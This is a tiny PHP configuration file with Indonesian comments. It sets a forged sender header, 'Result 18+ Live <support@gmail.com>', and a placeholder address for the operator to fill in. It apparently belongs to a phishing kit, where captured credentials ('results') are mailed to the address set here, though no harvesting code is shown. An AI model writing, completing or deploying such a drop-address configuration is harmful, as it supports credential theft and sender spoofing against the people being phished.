<?php

$sender = 'From: Result 18+ Live <support@gmail.com>'; // NAMA RESULT MU

$email = "emailmu@gmail.com"; // GANTI EMAIL MU

?>